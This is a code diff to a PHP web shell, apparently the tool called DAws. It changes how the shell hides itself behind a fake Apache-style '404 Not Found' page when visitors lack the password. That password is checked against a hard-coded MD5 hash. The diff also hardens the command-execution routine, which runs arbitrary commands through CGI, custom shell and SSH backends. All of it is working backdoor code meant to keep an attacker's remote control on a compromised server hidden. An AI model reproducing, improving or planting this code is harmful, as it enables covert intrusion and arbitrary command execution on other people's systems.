@@ -2,8 +2,9 @@
 
 @session_start(); //with error supression because using session_start() multiple times was causing an error on IIS for some reason which makes no sense at all.
 
-//static 404 page -->
-/*$static_fake_page = "
+//static 404 page
+//-->
+$static_fake_page = "
 <!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
 <html><head>
 <title>404 Not Found</title>
@@ -12,8 +13,9 @@
 <p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.</p>
 <hr>
 <address>".$_SERVER["SERVER_SOFTWARE"]." Server at ".$_SERVER['SERVER_ADDR']." Port 80</address>
-</body></html>";
+</body></html>"; //this will be used if DAws fails to show a dynamic fake 404 page
 
+/*
 if (!isset($_SESSION["logged_in"])) {
 	if (isset($_POST["pass"])) {
 		if(md5($_POST["pass"]) == "11b53263cc917f33062363cef21ae6c3") { //DAws
@@ -30,7 +32,8 @@ if (!isset($_SESSION["logged_in"])) {
 		echo $static_fake_page;
 		exit();
 	}
-}*///<--
+}*/
+//<--
 
 if (ob_get_level()) {
 	ob_end_clean(); //no point of having output buffering on yet
@@ -378,8 +381,14 @@ if (!isset($_SESSION["logged_in"])) {
 		
 		$random_string = time();
 		$random_url .= "://".$_SERVER['SERVER_NAME']."/".$random_string."/DAws.php"; //our random bitch
-		
-		echo str_replace("/".$random_string."/DAws.php", "/DAws.php", url_get_contents($random_url));
+		$output = url_get_contents($random_url);
+
+		if ($output != "") {
+			echo str_replace("/".$random_string."/DAws.php", "/DAws.php", $output);
+		} else {
+			echo $static_fake_page;
+		}
+
 		exit();
 	}
 }//<--
@@ -986,14 +995,16 @@ function execute_command($command, $software_check = False) { //this is also use
 		} else {
 			$return_value = $stderr;
 		}
-	} else if ($_SESSION["cgi"] == True) {
+	} else if ((isset($_SESSION["cgi"])) && ($_SESSION["cgi"] == True)) {
 		$return_value = url_get_contents($_SESSION["cgi_url"]."?command=".base64encoding($command));
-	} else if ($_SESSION["shsh"] == True) {
+	} else if ((isset($_SESSION["shsh"])) && ($_SESSION["shsh"] == True)) {
 		$return_value = shsh($command);
-	} else if ($_SESSION["shsh2"] == True) {
+	} else if ((isset($_SESSION["shsh2"])) && ($_SESSION["shsh2"] == True)) {
 		$return_value = shsh2($command);
-	} else if ($_SESSION["ssh"] == True) {
+	} else if ((isset($_SESSION["ssh"])) && ($_SESSION["ssh"] == True)) {
 		$return_value = execute_ssh($command);
+	} else {
+		$return_value = "";
 	}
 
 	if ($software_check == True) {
